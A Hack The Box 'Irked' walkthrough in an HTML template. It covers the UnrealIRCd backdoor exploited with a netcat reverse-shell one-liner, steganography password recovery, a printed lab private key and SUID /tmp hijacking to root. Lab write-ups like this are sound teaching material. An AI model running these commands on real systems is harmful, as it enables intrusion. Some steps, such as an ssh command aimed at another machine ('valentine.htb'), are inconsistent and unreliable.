@@ -1,0 +1,196 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Irked</h1>
+    <p class="text">Difficulty Easy | UserDifficulty 4.2</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV &lt;target_ip&gt; --min-rate=2000</u>
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
+|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
+|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
+|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
+80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.10 (Debian)
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          41788/tcp   status
+|   100024  1          49044/udp   status
+|   100024  1          58712/tcp6  status
+|_  100024  1          58866/udp6  status
+6697/tcp  open  irc     UnrealIRCd
+8067/tcp  open  irc     UnrealIRCd
+41788/tcp open  status  1 (RPC #100024)
+65534/tcp open  irc     UnrealIRCd</code></pre></div>
+
+<p class="text">Too many output... <br>But don't be scared. In this kind of case, the target might be UnrealIRCd just because we rarely see this application.</p>
+<p class="text"><u>※Lesson</u> : If you see an open port with reraly seen application, you should enumerate the app because it's not rare that the app is the target.</p>
+
+<p class="text">Because we found rare application, let's google it and check if we can exploit it.</p>
+
+<p class="text">Googling the keyword <u>UnrealIRCd vulnerability</u> revealed the vulnerability numbered <a href="https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2010-2075">CVE-2010-2075</a>. Let's search it deeper.</p>
+
+<h2 class="subtitle">Foothold</h2>
+<p class="text">After keep digging, I found interesting <a href="https://nmap.org/nsedoc/scripts/irc-unrealircd-backdoor.html">page</a> where explains how to exploit backdoor vulnerability. According to this page, we can send arbitrary commad to target machine.</p>
+
+<div class="code-box"><pre><code>└─$ nmap -d -p8067 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command=' <u>Replace here</u> ' &lt;target_ip&gt;
+<u class="green"># I uses code below...</u>
+nmap -d -p8067 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.7 4444 >/tmp/f' 10.129.69.182</code></pre></div>
+
+<p class="text">We got reverse-shell with user <u>ircd</u>.</p>
+
+
+<h2 class="subtitle">Lateral Movement</h2>
+
+<p class="text">While researching several directory, I found interesting file <u>:/home/djmardov/Documents/.backup</u> which include steganography password. Because there is no suspicious image file except for <u>/var/www/html/irked.jpg</u>, I tried decoding it.</p>
+
+<div class="code-box"><pre><code>ircd@irked:/home/djmardov/Documents$ cat .backup 
+steghide extract -p UPupDOWNdownLRlrBAbaSSss -sf irked.jpg
+...
+└─$ <u>steghide extract -p UPupDOWNdownLRlrBAbaSSss -sf irked.jpg</u>
+Kab6h+m+bbp2J:HG</code></pre></div>
+
+<p class="text">We successfully got password for user djmardov.</p>
+
+<div class="code-box"><pre><code>└─$ ssh djmardov@&lt;target_ip&gt;
+...</code></pre></div>
+<p class="text">However, ssh doesn't return any response. We may be able to get connection with id_rsa key.</p>
+
+<div class="code-box"><pre><code>ircd@irked:/home/djmardov/Documents$ <u>ssh-keygen</u>
+...  <u class="green"># You can leave all inputs empty, and this command will produce id_rsa key under ~/.ssh automatically.</u>
+ircd@irked:/home/djmardov/Documents$ <u>cd ~/.ssh</u>
+ircd@irked:/home/djmardov/Documents$ <u>cat id_rsa</u>
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAq+8bfKFvWPNBywAcNuOUuR5H60E/bwc4SnZGa8bruko5N1IQ
+SXmfFmsEcMwYG4neQkOCRnY/of9FYBLYQZ4H1JCzwRaYCtLyNQNPLEWSBI+m7hNH
+qSVhT7u2Y5nDrdKi3uye61UFC7PkcEOgrHlm+UU/FPiK48deBfKl+VDthIottOV5
+uhc3AhiGv6Lf4742yEx3b6OpYvUGXuJbcat8A8C8jtwle31pg88iXpjhIfvVX7lB
+hB4n8VPZvXSMIYKwjncOOb959K298g/H8/wj5aTHu+mrHl8x+Y5X7mNUA/8mYyhz
+SPT2tIB+kqsKrrUlMDOe/pbDe5PjlcAACmLGSQIDAQABAoIBAQCRwdAUlSs3Rmol
+dX91zPN9CD3CI/tp3b4L6j8DCY03zcq5qlliYLfMoocONQfO+M8yb9bWc1K4vBcN
+PoyU/Cr5On8ZF1Vn/7MT3C1Xg9cpBLtoo3Gh5K2dka4qu+VWy/YFdKW5LcdsR2JH
+Bh4FeZohgmHbHmVoetCrzCyGsuPY8oMlxGbB14/dxIGURoU1XdE+nZBCr1rZNnjg
+7Tweu9ngh2UnSJowxPCsA8OYApf4VjU3HNnG8HDB6J6G7daCygVdbEZ1MLFkzAhS
+Hs2fRJS/pujsRhkWAM3gHXNGvSRSxvfSTqoXw6WDQqDITA2wwg+AMVFpZTnJP4/d
+XrH9PFQBAoGBAN946F99CwmjP53RWd2f9enj83krBqIJC8It39k4kPmt7BxhMxIi
+H7tKp+zpd5W1D0zjxjhiSP50OStdYXtePAo9O+iwIP1GGizs3BDMICCby9KlCFsW
+9kVLNSTbrY8Mxnk3aRoW3NQo3jPdgE0K3paDuhyi1ZEyevnNSMEexN2BAoGBAMT1
+w7vpru6ocdHkqx5hrof9EHWL+Y7xxVEKX6O8MES/L0iwRZfEuszpLNBISqFqO3OX
+YPePLpN/K92s8XuAkVElchI17t7bMz8MYobCs2L1Feal4DbdodlKyuuy30xmj5Rt
+GwtxcTzWZehUJvxNGVqqUICb2rCovPAn5fCadtzJAoGADPGf5AgGH6TJBocdwWyG
+femqLJaFZ9VGTRUDJj3Uh+G/D1XB84bud5a3a02Kk61NGZMH5DQtLi/lL9HU16R5
+rc4mLjAleQYadgeyJ3brVXgwsh7FASGvWgwlI+FliCehR1wiRlSUreVAGZj22X+L
+rQQsP4RfAm3+GYH+eNEjbgECgYAUqJqBKT+Z9L0LgOqZ4zEFPnvteGMSpTVHDMl/
+SQvfChaRjzudcZsORx7WMd7yE0xtEWGwVapS+jHFrJAfnhqf4keWtWV6po83e7sR
+23YpWP+VE6zy1EhXnEqwcjCNuOwya0c86gcwlGRX/AuixwtzwQ10j+ReRzSaE/VA
+SVNSUQKBgQCk0DsurKehEjsFkNuEVB4TdjpB92DjZ+jrXDaYAu8d2bCVi1Lzd2e9
+qN1JPAwoGkUIrAWL5++CrTrN3xCrWlSqZQvF2eBlBkmJkTIy+O9Q/JFjP4/0IIEK
+yPj00TgO3g6wWcJ5Oc0ncQgBpu4PpLjM3cjNBPeYHl/8ONOEohk5Xw==
+-----END RSA PRIVATE KEY-----</code></pre></div>
+
+
+
+<p class="text">Then, copy and paste output to your local machine and name the file id_rsa, and execute command <u>chmod 600 id_rsa</u>. Let's try again.</p>
+
+<div class="code-box"><pre><code>└─$ ssh -i id_rsa valentine@valentine.htb
+...</code></pre></div>
+
+
+<p class="text">Again, it doesn't return ssh connection. Actually, if the target machine uses old ssh protocol, it's not rare case that standard ssh command cannot establish conneciton because old ssh version doesn't support latest ssh-public-key. Therefore, we have to indicate public key we use. First, we execute the same command with flag <u>-vvv</u>.</p>
+
+<div class="code-box"><pre><code>└─$ 
+...
+debug1: kex: server->client cipher: chacha20-poly1305@openssh.com MAC: &lt;implicit> compression: none
+debug1: kex: client->server cipher: chacha20-poly1305@openssh.com MAC: &lt;implicit> compression: none
+debug3: send packet: type 30
+<u>debug1: expecting SSH2_MSG_KEX_ECDH_REPLY</u></code></pre></div>
+
+<p class="text">Then, let's google the error message. <a href="https://unix.stackexchange.com/questions/722954/ssh-stuck-at-expecting-ssh2-msg-kex-ecdh-reply">This</a> page told me several debug option. After trying several KexAlgorithm optinos, I found how the way to debug this problem.</p>
+
+<div class="code-box"><pre><code>└─$ ssh -o MACs=hmac-sha2-256 -i id_rsa djmardov@10.129.69.182
+    <u class="green">※You should remove -vvv options because it display annoying texts even after established conneciton.</u>
+djmardov@irked:~$ </code></pre></div>
+
+<p class="text">We got access to the user djmardov.</p>
+
+
+<h2 class="subtitle">PrivEsc</h2>
+
+<p class="text">The user doesn't have sudo privilege. Therefore, I checked if there is usable binary with SUID for finding another vector.</p>
+
+<div class="code-box"><pre><code>djmardov@irked:~$ <u>find / -perm -4000 -type f 2>/dev/null</u>
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
+/usr/sbin/exim4
+/usr/sbin/pppd
+/usr/bin/chsh
+/usr/bin/procmail
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/pkexec
+/usr/bin/X
+/usr/bin/passwd
+/usr/bin/chfn
+<u>/usr/bin/viewuser</u>
+/sbin/mount.nfs
+/bin/su
+/bin/mount
+/bin/fusermount
+/bin/ntfs-3g
+/bin/umount</code></pre></div>
+
+
+<p class="text">There is interesting binary. Let's dig into how it works. Because target machine doesn't have command <u>ltrace</u>, we have to download viewuser binary to our local machine.</p>
+
+<div class="code-box"><pre><code>└─$ <u>scp -v -o MACs=hmac-sha2-256 -i id_rsa djmardov@10.129.69.182:/usr/bin/viewuser viewuser</u>
+└─$ <u>ltrace ./viewuser</u>               
+__libc_start_main&#40;["./viewuser"] &lt;unfinished ...>
+puts("This application is being devleo"...This application is being devleoped to set and test user permissions
+) = 69
+puts("It is still being actively devel"...It is still being actively developed
+) = 37
+system("who" <no return ...>
+--- SIGCHLD (Child exited) ---
+&lt;... system resumed> )                = 0
+setuid(0)                             = -1
+system("<u>/tmp/listusers"sh: 1: /tmp/listusers: not found</u>
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+&lt;... system resumed> )                = 32512
++++ exited (status 0) +++</code></pre></div>
+
+
+<p class="text">Fortunately, we have edit right for /tmp and the binary file calls <u>/tmp/listusers</u>, but there is no such a file under the /tmp directory. Therefore, we can create file which include arbitrary code.</p>
+
+
+<div class="code-box"><pre><code>djmardov@irked:/tmp$ echo '/bin/bash' > listusers
+djmardov@irked:/tmp$ /usr/bin/viewuser
+# id
+uid=0(root) git=1000(djmardov) groups(djmardov),24(cdrom),25(floppy),117(bluetooth)</code></pre></div>
+
+
+<p class="text">You can find root flag on /root/root.txt</p>
+
+
+</body>
+</html>
